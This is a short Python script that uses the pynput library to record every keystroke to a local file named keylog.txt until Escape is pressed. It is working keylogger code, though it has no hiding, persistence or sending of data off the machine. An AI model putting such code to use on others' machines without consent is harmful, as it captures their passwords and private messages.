from pynput import keyboard

# Define the file where we want to save the keystrokes
log_file = "keylog.txt"

# Define the on_press function to log each key pressed
def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as log:
            # Handle special keys (like shift, enter, etc.)
            log.write(f" {key} ")

# Define the on_release function
def on_release(key):
    # Stop logging if the escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
